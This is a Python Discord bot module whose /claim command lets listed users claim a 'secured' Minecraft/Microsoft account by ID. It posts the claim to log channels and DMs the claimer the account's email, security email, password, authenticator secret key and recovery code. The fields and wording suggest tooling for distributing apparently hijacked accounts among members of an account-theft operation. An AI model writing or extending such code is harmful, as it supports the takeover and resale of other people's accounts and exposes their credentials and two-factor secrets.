from database.database import DBConnection
from discord.ext import commands
from urllib.parse import quote
import discord
import json


class Claim(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(name="claim", description="Claim a secured account by ID")
    async def claim(self, ctx: discord.ApplicationContext, id: str):
        config = json.load(open("config.json", "r+"))
        claims = config["claims"]

        if not claims["claims_enabled"]:
            await ctx.respond("Claims are not enabled.", ephemeral=True)
            return

        if ctx.author.id not in claims["claim_users"]:
            await ctx.respond("You do not have permission to claim accounts.", ephemeral=True)
            return

        with DBConnection() as database:
            if not database.is_valid_claim_id(id):
                await ctx.respond(
                    embed=discord.Embed(
                        title="Invalid Claim ID",
                        description=f"No secured account found with claim ID `{id}`.",
                        color=0xFF5C5C
                    ),
                    ephemeral=True
                )
                return

            if database.is_already_claimed(id):
                await ctx.respond(
                    embed=discord.Embed(
                        title="Already Claimed",
                        description=f"Claim ID `{id}` has already been claimed.",
                        color=0xFF5C5C
                    ),
                    ephemeral=True
                )
                return

            database.claim_account(id, ctx.author.id)
            account = database.get_secured_account(id)

        claim_embed = discord.Embed(
            title="Account Claimed",
            color=0x79D990
        )
        claim_embed.add_field(name="MC Username", value=f"`{account['mc_name']}`", inline=True)
        claim_embed.add_field(name="Claim ID", value=f"`{id}`", inline=True)
        claim_embed.add_field(name="Claimed By", value=f"{ctx.author.mention} (`{ctx.author.id}`)", inline=False)

        logs_channel = await ctx.bot.fetch_channel(config["discord"]["logs_channel"])
        await logs_channel.send(embed=claim_embed)

        censored_id = config["discord"]["censored_logs_channel"]
        if censored_id:
            censored_channel = await ctx.bot.fetch_channel(censored_id)
            await censored_channel.send(embed=claim_embed)

        name = quote(account["mc_name"])
        dm_embed = discord.Embed(
            title="Your Claimed Account",
            color=0x279CF5
        )
        dm_embed.add_field(name="MC Username", value=f"```{account['mc_name']}```", inline=False)
        dm_embed.add_field(name="MC Method", value=f"```{account['mc_method']}```", inline=True)
        dm_embed.add_field(name="MC Capes", value=f"```{account['mc_capes']}```", inline=True)
        dm_embed.add_field(name="Primary Email", value=f"```{account['ms_email']}```", inline=False)
        dm_embed.add_field(name="Security Email", value=f"```{account['ms_security_email']}```", inline=True)
        dm_embed.add_field(name="Password", value=f"```{account['ms_password']}```", inline=False)
        dm_embed.add_field(name="Secret Key", value=f"```{account['ms_auth_secret']}```", inline=False)
        dm_embed.add_field(name="Recovery Code", value=f"```{account['ms_recovery_code']}```", inline=False)
        dm_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")

        try:
            await ctx.author.send(embed=dm_embed)
            await ctx.respond(
                embed=discord.Embed(
                    title="Account Claimed",
                    description="Full account details have been sent to your DMs.",
                    color=0x79D990
                ),
                ephemeral=True
            )
        except discord.Forbidden:
            await ctx.respond(
                embed=discord.Embed(
                    title="Account Claimed",
                    description="Claimed successfully but couldn't DM you. Enable DMs from server members.",
                    color=0xFF5C5C
                ),
                ephemeral=True
            )

def setup(bot: commands.Bot) -> None:
    bot.add_cog(Claim(bot))
